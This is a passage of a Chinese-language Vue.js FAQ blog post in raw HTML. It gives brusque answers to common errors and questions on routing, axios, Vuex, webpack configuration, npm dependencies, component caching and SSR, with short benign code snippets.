里面配置了,只要加入这个属性就自动启用)</p>\n<pre><code class=\"hljs html\" lang=\"html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">\"scss\"</span> <span class=\"hljs-attr\">scoped</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span></code></pre><p>为什么不能继承或者覆写呢,那时因为每个类或者 id 乃至标签都会给自动在css后面添加hash!</p>\n<p>比如</p>\n<pre><code class=\"hljs css\" lang=\"css\">// 写的时候是这个\n.trangle{}\n\n// 编译过后,加上了 hash\n.trangle[data-v-1ec35ffc]{}</code></pre><p>这些都是在 css-loader 里面配置!!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-15\">Q:路由模式改为<code>history</code>后,除了首次启动首页没报错,刷新访问路由都报错!</h2><p>必须给对应的服务端配置查询的主页面..也可以认为是主路由入口的引导</p>\n<p>官方文档也有,为毛总有人不喜欢去看文档,总喜欢做伸手党....FUCK</p>\n<p><strong>传送门</strong> : <a href=\"https://link.juejin.im?target=https%3A%2F%2Frouter.vuejs.org%2Fzh-cn%2Fessentials%2Fhistory-mode.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vue-Router history Mode</a></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-16\">Q:我想拦截页面,或者在页面进来之前做一些事情,可以么?</h2><p>Of course !!</p>\n<p>各种路由器的钩子!! 传送门: <a href=\"https://link.juejin.im?target=https%3A%2F%2Frouter.vuejs.org%2Fzh-cn%2Fadvanced%2Fnavigation-guards.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><strong>导航守卫</strong></a>;</p>\n<p>当然,记忆滚动的位置也可以做到,详情翻翻里面的文档</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-17\">Q:<code>TypeError: xxx is not a function</code></h2><p>这种问题明显就是写法有问题...能不能动点脑子!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-18\">Q:<code>Uncaught ReferenceError: xxx is not define</code></h2><ul>\n<li>实例内的 <code>data</code> 对应的变量没有声明</li>\n<li>你导入模块报这个错误,那绝逼是导出没写好</li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-19\">Q:<code>Error in render function:\"Type Error: Cannot read property 'xxx' of undefined\"</code></h2><p>这种问题大多都是初始化的姿势不对;</p>\n<p>比如引入<code>echart</code>这些...仔细去了解下生命周期,再来具体初始化;</p>\n<p>vue 组件有时候也会(嵌套组件或者 <code>props</code>传递初始化)..也是基本这个问题</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-20\">Q:<code>Unexpected token: operator xxxxx</code></h2><p>大佬,这个一看就是语法错误啊.<br>基本都是符号问题.<br>一般报错会给出哪一行或者哪个组件</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-21\">Q:<code>npm run build</code>之后不能直接访问</h2><p>大佬!你最起码得在本地搭个服务器才能访问好么!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-22\">Q:CSS<code>background</code>引入图片打包后,访问路径错误</h2><p>因为打包后图片是在根目录下,你用相对路径肯定报错啊....<br>你可以魔改 webpack 的配置文件里面的<code>static</code>为<code>./static</code>...但是不建议</p>\n<p>你若是把图片什么丢到<code>assets</code>目录下,然后相对路径,打包后是正常的</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-23\">Q:安装模块时命令窗口输出<code>unsupported platform xxx</code></h2><p>一般两种情况,<code>node</code>版本不兼容,系统不兼容;</p>\n<p>解决方案: 要么不装,要么满足安装要求;</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-24\">Q:<code>Unexpected tab charater</code>这些</h2><p>一般是你用脚手架初始化的时候开了 eslint ;</p>\n<p>要么遵循规则,要么改变规则;</p>\n<p>要么直接把 webpack 里面的 eslint 检测给关闭了</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-25\">Q:<code>Failed to mount component: template or render function not defined</code></h2><p>组件挂载失败,问题只有这么几个</p>\n<p>组件没有正确引入; 挂载点顺序错了了;</p>\n<p>自行动手排查</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-26\">Q:<code>Unknown custom element: &lt;xxx&gt; - did you register the component correctly?</code></h2><p>组件没有正确引入或者正确使用,依次确认</p>\n<ol>\n<li>导入对应的组件</li>\n<li>在 components 内声明</li>\n<li>在 dom 区域声明标签</li>\n</ol>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-27\">Q: <code>axios</code>的 <code>post</code> 请求后台接受不到!</h2><p><code>axios</code>默认是 json 格式提交,确认后台是否做了对应的支持;</p>\n<p>若是只能接受传统的表单序列化,就需要自己写一个转义的方法...</p>\n<p>当然还有一个更加省事的方案,装一个小模块<code>qs</code></p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\">\nnpm install qs -S\n\n\n<span class=\"hljs-comment\">// 然后在对应的地方转就行了..单一请求也行,拦截器也行...我是写在拦截器的.</span>\n<span class=\"hljs-comment\">// 具体可以看看我 axios 封装那篇文章</span>\n\n<span class=\"hljs-comment\">//POST传参序列化(添加请求拦截器)</span>\nAxios.interceptors.request.use(\n  <span class=\"hljs-function\"><span class=\"hljs-params\">config</span> =&gt;</span> {\n    <span class=\"hljs-comment\">// 在发送请求之前做某件事</span>\n    <span class=\"hljs-keyword\">if</span> (\n      config.method === <span class=\"hljs-string\">\"post\"</span>\n    ) {\n      <span class=\"hljs-comment\">// 序列化</span>\n      config.data = qs.stringify(config.data); <span class=\"hljs-comment\">// ***** 这里转义</span>\n    }\n\n    <span class=\"hljs-comment\">// 若是有做鉴权token , 就给头部带上token</span>\n    <span class=\"hljs-keyword\">if</span> (localStorage.token) {\n      config.headers.Authorization = localStorage.token;\n    }\n    <span class=\"hljs-keyword\">return</span> config;\n  },\n  error =&gt; {\n    Message({\n      <span class=\"hljs-comment\">//  饿了么的消息弹窗组件,类似toast</span>\n      showClose: <span class=\"hljs-literal\">true</span>,\n      <span class=\"hljs-attr\">message</span>: error,\n      <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"error.data.error.message\"</span>\n    });\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Promise</span>.reject(error.data.error.message);\n  }\n);</code></pre><hr>\n<h2 class=\"heading\" data-id=\"heading-28\">Q:<code>Invalid prop: type check failed for prop \"xxx\". Expected Boolean, got String.</code></h2><p>这种问题一般就是组件内的 <code>props</code> 类型已经设置了接受的范围类型,<br>而你传递的值却又不是它需要的类型,写代码严谨些 OK?</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-29\">Q: 过滤器可以用于DOM区域结合指令么?</h2><pre><code class=\"hljs html\" lang=\"html\">// 不行,看下面的错误例子\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">li</span> <span class=\"hljs-attr\">v-for</span>=<span class=\"hljs-string\">\"(item,index) in range | sortByDesc | spliceText\"</span>&gt;</span>{{item}}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">li</span>&gt;</span>\n\n// `vue2+`的指令只能用语 mustache`{{}}` , 正确姿势如下:\n\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>{{ message | capitalize }}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span></code></pre><hr>\n<h2 class=\"heading\" data-id=\"heading-30\">Q: <code>[...Array]</code>,<code>...mapState</code>,<code>[SOME_MUTATION] (state) {}</code>,<code>increment ({ commit }) {}</code>这种写法是什么鬼!</h2><p>出门左拐,ES6+(ES2015)的基础去过一遍..</p>\n<p>上面依次:数组解构,对象解构,对象风格函数,对象解构赋值传递</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-31\">Q: 我的 Vue 网站为什么 UC 访问一片空白亦或者<code>flex</code>布局错乱!!</h2><p>来来来,墙角走起.... <strong>UC 号称移动界的 IE 这称号不是白叫的</strong></p>\n<ul>\n<li><code>flexbox</code> 布局错乱,一般是你没有把兼容方案写上..就是带各种前缀,复合属性拆分<ul>\n<li>看看我这篇文章:<a href=\"https://link.juejin.im?target=http%3A%2F%2Fblog.csdn.net%2Fcrper%2Farticle%2Fdetails%2F51902681\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">移动端爬坑记 --- （1）布局与样式上的奇葩偶遇</a>, 最好就用插件来代替人力吧,,引入 <code>autoprefixer</code>, 写上兼容范围就好了.</li>\n</ul>\n</li>\n<li><code>UC访问空白</code>, 有一种情况绝对会造成,那就是 ES6的代码降级不够彻底. 其他情况可能就是路由配置问题(自己去排除)<ul>\n<li>现在的开发都推荐按需引入,靠<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fbabel%2Fbabel-preset-env\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><code>babel-preset-env</code></a> 来控制,以达到打包体积减小.</li>\n<li>但是这样做的后果,有些内核比较老的...嘿嘿..拜拜..</li>\n<li>所以最好把代码完全 ES5话!!记住有些特性不能乱使用,没有对应的 <code>polyfill</code>,比如 ES6 的<code>proxy</code></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-32\">Q:<code>this.$set | this.$xxx</code> 这个 <code>$</code> 是个什么意思?是 <code>jQuery</code>的么,会冲突么?</h2><p>且看我细细道来.</p>\n<p>Vue 的<code>$</code>和 jQuery 的<code>$</code>并没有半毛钱的关系,就跟<code>javascript</code>和<code>java</code>一样.</p>\n<p>Vue 的<code>$</code>是封装了一些 vue 的内建函数,然后导出以<code>$</code>开头...这显然并不是 <code>jQuery</code>的专利;</p>\n<p>jQuery 的<code>$</code>是选择器!!取得 DOM区域...两者的作用完全不一致!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-33\">Q:Module not found: Error : Can't resolve <code>xxx-loader</code> in xxxx</h2><p>这里问题一般就是webpack的配置文件你改动了或对应的 loader 没有装上</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-34\">Q: 父组件可以直接调用子组件的方法么!</h2><p>可以,通过<code>$refs</code>或者<code>$chilren</code>来拿到对应的实例,从而操作</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-35\">Q:<code>Error in event handler for \"click\":\"xxx\"</code></h2><p>这个问题大多都是你写的代码有问题.你的事件触发了.<br>但是组件内部缺少对应的实现或者变量,所以抛出事件错误.</p>\n<p>解决方案:看着报错慢慢排查</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-36\">Q: 组件的通讯有哪几种啊!!!</h2><p>基本最常用的是这三种;</p>\n<ol>\n<li>父传子: <code>props</code></li>\n<li>子传父: <code>emit</code></li>\n<li>兄弟通讯:<ul>\n<li><code>event bus</code>: 就是找一个中间组件来作为信息传递中介</li>\n<li><code>vuex</code>: 信息树</li>\n</ul>\n</li>\n</ol>\n<p>传送门:</p>\n<ul>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fguide%2Fcomponents.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">基本通讯</a></li>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fvuex.vuejs.org%2Fzh-cn%2Fintro.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vuex</a></li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-37\">Q:既然<code>localStorage</code>和<code>sessionStorage</code>能做到数据维护,为什么还要引入<code>vuex</code>!</h2><p>这个问题问得好,<code>Vuex</code>的目的用来维护同级组件间的数据通讯,拥有一个共同的状态树;</p>\n<p>仅仅活在<code>SPA</code>的里面的<strong>伪多页(路由)</strong>内, 这种东东明明然<code>localStorage</code>和<code>sessionStorage</code><br>也可以做到,还能做到跨页面数据维护..还不会被浏览器刷新干掉...</p>\n<p>为什么还要引入 <code>vuex</code>, 我个人觉得原因只有这么一个,\"可维护性\"和\"易用性\"及</p>\n<p>怎么理解呢?</p>\n<ul>\n<li>可维护性: 因为是单向数据流,所有状态是有迹可循的...数据的传递也可以及时分发响应</li>\n<li>易用性: 它使得我们组件间的通讯变得更强大,而不用借助中间件这类来实现不同组件间的通讯</li>\n</ul>\n<p>而且代码量不多,若是你要用 <code>ls</code>或者<code>ss</code>,你必须手动去跟踪维护你的状态表...<br>虽说可行,但是代码量会多很多,而且可读性很差...</p>\n<p>是不是每个项目都需要用到<code>vuex</code>?<br>答案是否定的,小型项目上这个反而是累赘..这东西一般是用在中型项目+的,<br>因为里面涉及需要维护的数据比较多,同级组件间的通讯比较频繁</p>\n<p>若是用到<code>vuex</code>的项目记得结合<code>ss</code>或者<code>ls</code>来达到某些状态持久化!!!为什么看下面!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-38\">Q:vuex的用户信息为什么还要存一遍在浏览器里(sessionStorage or localStorage)</h2><p>因为 <code>vuex</code>的 store 干不过刷新啊.<br>保存在浏览器的缓存内,若用户刷新的话,值再取一遍呗;</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-39\">Q:\"有 Vue + Vue Router + Vuex\"或什么\"express + vue + mongodb\"的项目学习么</h2><p>Github 一搜一大堆,提这些问题的人动动脑子!.传送门:<a href=\"https://link.juejin.im?target=http%3A%2F%2Fgithub.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><strong>Github</strong></a></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-40\">Q:线上若是 nginx,如何部署?以及反向代理这些!!</h2><p>传送门:<a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F58bfc412da2f60124db5999a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">一篇不大靠谱的nginx 1.11.10配置文件</a></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-41\">Q:\"我会 Vue 我还需要学习 jQuery 或者原生 JS 么\"</h2><p><code>jQuery</code>还有很多公司在用,源码可以学习的地方很多;</p>\n<p>原生 js 是根本,不管是哪个前端框架,最终都是 js 实现的;<br>只有基础扎实,才能学的比较深...</p>\n<p>框架只是加快开发,提高效率,但不是你在这一行长期立足的根本;</p>\n<p>前端的人不仅需要宽度,也要深度...这样才能走的更远....</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-42\">Q: npm run dev 报端口错误!<code>Error: listen EADDRINUSE :::8080</code></h2><ul>\n<li>自己用 webpack搭脚手架的都不用我说了;</li>\n<li>Vue-cli 里面的 webpack 配置: config/index.js</li>\n</ul>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\">  dev: {\n    <span class=\"hljs-attr\">env</span>: <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">\"./dev.env\"</span>),\n    <span class=\"hljs-attr\">port</span>: <span class=\"hljs-number\">8080</span>, <span class=\"hljs-comment\">//  这里这里,若是这个端口已经给系统的其他程序占用了.改我改我!!!!!!</span>\n    autoOpenBrowser: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-attr\">assetsSubDirectory</span>: <span class=\"hljs-string\">\"static\"</span>,\n    <span class=\"hljs-attr\">assetsPublicPath</span>: <span class=\"hljs-string\">\"/\"</span>,\n    <span class=\"hljs-attr\">proxyTable</span>: {\n      <span class=\"hljs-string\">\"/bp-api\"</span>: {\n        <span class=\"hljs-attr\">target</span>: <span class=\"hljs-string\">\"http://new.d.st.cn\"</span>,\n        <span class=\"hljs-attr\">changeOrigin</span>: <span class=\"hljs-literal\">true</span>,\n        <span class=\"hljs-comment\">// pathRewrite: {</span>\n        <span class=\"hljs-comment\">//   \"^/bp-api\": \"/\"</span>\n        <span class=\"hljs-comment\">// }</span>\n      }\n    },</code></pre><hr>\n<h2 class=\"heading\" data-id=\"heading-43\">Q: 什么时候用<code>v-if</code>,什么用 <code>v-show</code>!</h2><p>我们先来说说两者的核心差异;</p>\n<ul>\n<li><code>v-if</code> :  DOM 区域没有生成,没有插入文档..等条件成立的时候才动态插入到页面!<ul>\n<li>有些需要遍历的数组对象或者值,最好用这货控制,等到拿到值才处理遍历,不然一些操作过快的情况会报错,比如数据还没请求到!</li>\n</ul>\n</li>\n<li><code>v-show</code>: DOM 区域在组件渲染的时候同时渲染了,只是单纯用 css 隐藏了<ul>\n<li>对于下拉菜单,折叠菜单这些数据基本不怎么变动.用这个最合适了..而且可以改善用户体验,因为它不会导致页面的<strong>重绘</strong>,DOM 操作会! </li>\n</ul>\n</li>\n</ul>\n<p>简言之: DOM结构不怎么变化的用<code>v-show</code>, 数据需要改动很大或者布局改动的用<code>v-if</code></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-44\">Q: <code>&lt;template&gt;</code>是什么,html5的标签么?</h2><p>你猜对了..html5的标签还真有这么一个.传送门<a href=\"https://link.juejin.im?target=https%3A%2F%2Fcaniuse.com%2F%23search%3Dtemplate\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Can I Use:template</a></p>\n<p>不过 Vue 的 template 有点不一样,不是去给浏览器解析的....<br>你可以理解为一个临时标签,用来方便你写循环,判断的....<br>因为最终 template 不会解析到浏览器的页面,他只是在 Vue 解析的过程充当一个包裹层!<br>最终我们看到的是内部处理后的组合的 DOM 结构!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-45\">Q:<code>the \"scope\" attribute for scoped slots …. replaced by \"slot-scope\" since 2.5</code></h2><p>这个问题只出现老项目升级到 vue2.5+的时候, 提示就是 scope 现在要用 slot-scope 来代替,<br>但是 scope 暂时可以用,以后会移除</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-46\">Q: <code>Uncaught ReferenceError : Vue is not defined!</code></h2><p>依次排除:</p>\n<ul>\n<li>Vue是否正确引入!</li>\n<li>Vue是否正确实例化!</li>\n<li>Vue 用的姿势是否正确(比如你直接一个 Vue 的变量!!!刚好又没定义,,具体问题具体分析吧)</li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-47\">Q: <code>ERROR in static/js/xxxxxxx.js from UglifyJs</code></h2><p>我知道其中一种情况会报这种情况,就是你引入的 js,是直接引入压缩版本后的 js(<code>xxx.min.js</code>);<br>然后 webpack 内又启用了 UglifyJs(压缩 JS的), 二重压缩大多都会报错!!</p>\n<p>解决方案:引入标准未压缩的 JS</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-48\">Q:<code>props</code>不使用<code>:(v-bind)</code>可以传递值么!</h2><p>可以,只是默认传递的类型会被解析成字符串!<br>若是要传递其他类型,该绑定还是绑定!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-49\">Q: <code>Uncaught TypeError : Cannot set property xxx which has only a getter</code></h2><p>这个问题就是你要操作的属性只允许 <code>getter</code>,不允许 <code>setter</code>;</p>\n<p>解决方案? 用了别人的东西就要遵循别人的套路来,不然就只能自己动手丰衣足食了!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-50\">Q: 单组件中里面的 <code>import xxx from '@/components/layout/xxx'</code>中的<code>@</code>是什么鬼!</h2><p>这是 webpack 方面的知识,看到了也说下吧...</p>\n<p>webpack可以配置<code>alias</code>(也就是路径别名),玩过 linux 或者 mac 都知道</p>\n<p>依旧如上,会自己搭脚手架的不用我说了...看看 vue-cli 里面的;</p>\n<p>文件名: build -&gt; webpack.base.conf.js</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\">\n resolve: {\n    <span class=\"hljs-attr\">extensions</span>: [<span class=\"hljs-string\">\".js\"</span>, <span class=\"hljs-string\">\".vue\"</span>, <span class=\"hljs-string\">\".json\"</span>], <span class=\"hljs-comment\">// 可以导入的时候忽略的拓展名范围</span>\n    alias: {\n      <span class=\"hljs-attr\">vue$</span>: <span class=\"hljs-string\">\"vue/dist/vue.esm.js\"</span>,  \n      <span class=\"hljs-string\">\"@\"</span>: resolve(<span class=\"hljs-string\">\"src\"</span>),  <span class=\"hljs-comment\">// 这里就是别名了,比如@就代表直接从/src 下开始找起!!!</span>\n      <span class=\"hljs-string\">\"~\"</span>: resolve(<span class=\"hljs-string\">\"src/components\"</span>)\n    }\n  },</code></pre><hr>\n<h2 class=\"heading\" data-id=\"heading-51\">Q: <code>SCSS(SASS)</code> 还是 <code>less</code>,<code>stylus</code> 好!!</h2><p>三者都是预处理器;</p>\n<p>scss 出现最久,能做的功能比较多,但是若是普通的嵌套写法,继承,mixin 啊.</p>\n<p>这三个都差不多..会其中一个其他两个的粗浅用法基本也会了.不过!!!!</p>\n<p>写法有些差异:</p>\n<ul>\n<li>scss: 写法上是像 css 靠齐 </li>\n<li>sass : 其实也就是 scss , 只是写法不一样...靠的是缩进</li>\n<li>less : 跟 css 基本靠齐</li>\n<li>stylus : 一样,靠缩进..跟<code>pug(Jade)</code>一样</li>\n</ul>\n<p>使用环境的差异:</p>\n<ul>\n<li>scss 可以借助 ruby 或者 node-sass 编译</li>\n<li>less 可以用 less.js 或者对应的 loader 解析</li>\n<li>stylus 只能借助 loader 解析,它的出现就是基于 node 的</li>\n</ul>\n<p>也有一个后起之秀,主打解耦,插件化的!!! 那就是<code>PostCSS</code>,这个是后处理器!!!<br>有兴趣的可以自行去了解,上面的写法都能借助插件实现!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-52\">Q:<code>Failed to compile with x errors : This  dependency was not found !</code></h2><p>编译错误,对应的依赖没找到!!!</p>\n<p>解决如下:</p>\n<ul>\n<li>知道缺少对应的模块,直接装进去</li>\n<li>若是一个你已经安装的大模块(比如 axios)里面的子模块(依赖包)出了问题,卸载重装整个大模块.因为你补全不一定有用!</li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-53\">Q:SyntaxError: Unexpected identifier;</h2><p>语法错误,看错误信息去找到对应的页面排查!!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-54\">Q: 为什么我的 <code>npm</code> 或者 <code>yarn</code> 安装依赖会生成 <code>lock</code>文件,有什么用!</h2><p>lock 文件的作用是统一版本号,这对团队协作有很大的作用;</p>\n<p>若是没有 lock 锁定,根据<code>package.json</code>里面的<code>^</code>,<code>~</code>这些..</p>\n<p>不同人,不同时间安装出来的版本号不一定一致;</p>\n<p>有些包甚至有一些<code>breaking change</code>(破坏性的更新),造成开发很难顺利进行!!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-55\">Q: 组件可以缓存么?</h2><p>可以,用<code>keep-alive</code>;</p>\n<p>不过是有代价的..占有内存会多了...所以无脑的缓存所有组件!!!别说性能好了..切换几次,<br>有些硬件 hold不住的,浏览器直接崩溃或者卡死..</p>\n<p>所以<code>keep-alive</code>一般缓存都是一些列表页,不会有太多的操作,更多的只是结果集的更换..</p>\n<p>给路由的组件<code>meta</code>增加一个标志位,结合<code>v-if</code>就可以按需加上缓存了!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-56\">Q:<code>package.json</code>里面的<code>dependencies</code> 和<code>devDependencies</code>的差异!</h2><p>其实不严格的话,没有特别的差异;<br>若是严格,遵循官方的理解;</p>\n<ul>\n<li><code>dependencies</code> : 存放线上或者业务能访问的核心代码模块,比如 <code>vue</code>,<code>vue-router</code>;</li>\n<li><code>devDependencies</code>: 处于开发模式下所依赖的开发模块,也许只是用来解析代码,转义代码,但是不产生额外的代码到生产环境, 比如什么<code>babel-core</code>这些</li>\n</ul>\n<p>如何把包安装到对应的依赖下呢?</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\">\nnpm install --save xxxx <span class=\"hljs-comment\">// dependencies</span>\nnpm install --save-dev xxxx <span class=\"hljs-comment\">// devDependencies</span>\n\n<span class=\"hljs-comment\">//也能用简易的写法(i:install,-S:save,-D:save-dev)</span>\n\nnpm i -S xxxx <span class=\"hljs-comment\">// npm install --save xxxx</span>\nnpm i -D xxxx <span class=\"hljs-comment\">// npm install --save-dev xxxx</span></code></pre><hr>\n<h2 class=\"heading\" data-id=\"heading-57\">Q: 安装<code>chromedriver</code>报错!!姿势没错啊<code>npm i -D chromedriver</code></h2><p>恩,伟大的 GFW.....解决方案:指定国内的源安装就可以了</p>\n<p><code>npm install --save-dev chromedriver --chromedriver_cdnurl=http://cdn.npm.taobao.org/dist/chromedriver</code></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-58\">Q:Vue ,React, Angular学习哪个好?哪个工作比较好找!</h2><p>Vue属于渐进式开发,传统开发过渡 MVVM 模式的小伙伴,<code>Vue</code> 比较好上手,学习成本比较低<br>基础比较好的,有折腾精神的,可以选择<code>NG5</code>或者<code>React 16</code>;</p>\n<p>NG5需要学习<code>typescript</code>和<code>rxjs</code>,还用到比较多的新东西,比如装饰器,后端的注入概念.ng有自己的一整套 MVVM 流程;</p>\n<p>而<code>Vue</code>和<code>React</code>核心只是<code>view</code>,可以搭配自己喜欢的</p>\n<p><code>React</code>的写法偏向函数式写法,还有 jsx,官方自己有 <code>flow</code>,当然也能搭配<code>ts</code>,我也没怎么接触..所以也有一定的学习成本;</p>\n<p>至于哪个比较好找工作!!!告诉你..若是只会一个框架,那不是一个合格的前端;</p>\n<p>人家要的是动手能力,解决能力!!!!<strong>技术和待遇是成正比的</strong>!!</p>\n<p>颜值和背景,学历,口才可以加分..但是这些条件你必须要有的基础下才能考虑这些!!!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-59\">Q: 我有个复杂组件需要有新增和编辑的功能同时存在,但是字段要保持不变性怎么破</h2><p>字段保持不变性怎么理解呢? 就是说比如新增和编辑同时共享一份 <code>data</code>;</p>\n<p>有一种就是路由变了,组件渲染同一个(不引起组件的重新渲染和销毁!),但是功能却不同(新增和编译)..</p>\n<p>比如从编辑切到新增,<code>data</code>必须为空白没有赋值的,等待我们去赋值;</p>\n<p>这时候有个东西就特别适合了,那就是<a href=\"https://link.juejin.im?target=https%3A%2F%2Ffacebook.github.io%2Fimmutable-js%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">immutable-js</a>;</p>\n<p>这个东西可以模拟数据的唯一性!或者叫做不变性!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-60\">Q:\"首屏加载比较慢!!怎么破!打包文件文件比较大\"</h2><p>依次排除和确认:</p>\n<ul>\n<li>减少第三方库的使用,比如<code>jquey</code>这些都可以不要了,很少操作 dom,而且原生基本满足开发</li>\n<li>若是引入<code>moment</code>这些,webpack 排除国际化语言包</li>\n<li>webpack 常规压缩js,css, 愿意折腾的还可以引入 dll 这些</li>\n<li>路由组件采用懒加载</li>\n<li>加入路由过渡和加载等待效果,虽然不能解决根本,但起码让人等的舒心一点不是么!!!</li>\n</ul>\n<p>整体下来,打包之后一般不会太大;</p>\n<p>但是倘若想要更快?那就只能采用服务端渲染(SSR)了,可以避免浏览器去解析模板和指令这些;<br>直接返回一个 html ....还能 SEO...</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-61\">Q: Vue SPA 没法做优化(SEO)!有解决方案么</h2><p>可以的,SSR(服务端渲染就能满足你的需求),因为请求回来就是一个处理完毕的 html</p>\n<p>现在 vue 的服务端开发框架有这么个比较流行,如下</p>\n<p>传送门:<a href=\"https://link.juejin.im?target=https%3A%2F%2Fzh.nuxtjs.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Nuxt.js</a></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-62\">Q: Vue可以写 hybird App 么!</h2><p>当然可以,两个方向.</p>\n<ul>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fcordova.apache.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">codorva</a> + <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Frigor789%2Fnativescript-vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">nativescript</a></li>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fweex.apache.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Weex</a></li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-63\">Q: Vue 可以写桌面端么?</h2><p>当然可以,有<code>electron</code>和<code>node-webkit(nw)</code>;</p>\n<p>我只了解过<code>electron</code>;</p>\n<ul>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Felectron.atom.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">electron</a></li>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FSimulatedGREG%2Felectron-vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">electron-vue</a>: Vue-cli 针对 electron 的脚手架模板</li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-64\">Q: Vue开发,项目中还需要 <code>jQuery</code>么</h2><p>分情况探讨:</p>\n<ol>\n<li>若是老项目,只是单纯引入 Vue 简化开发的,依旧用吧...</li>\n<li>重构项目?或者发起新项目的,真心没必要了.开发思路不一样,很多以前用 DOM 操作的现在基本可以数据驱动实现,而少量迫不得已的DOM 操作原生就能搞定...而且能减小打包体积,速度又快,何乐而不为!!!</li>\n</ol>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-65\">Q:Vue PC(桌面)端,M(mobile:移动)端,用什么 UI 框架好啊!!!</h2><p><strong>PC</strong></p>\n<p>我推荐的只有两个 <code>element UI</code>和<code>iview</code></p>\n<p><strong>Mobile</strong></p>\n<p><code>Vux</code></p>\n<p>当然还有很多,但是基本用户的认知度都不高,这三个比较流行</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-66\">Q: Vue可以写微信小程序么,怎么搞起</h2><p>可以的,社区也有人出了对应的解决方案,比如比较流行的方案<code>wepy</code>;<br><code>wepy</code>你也可以理解为一个脚手架,让你的写小程序的方式更贴近你用<code>vue-cli</code>写 vue 的感觉...</p>\n<p>传送门:<a 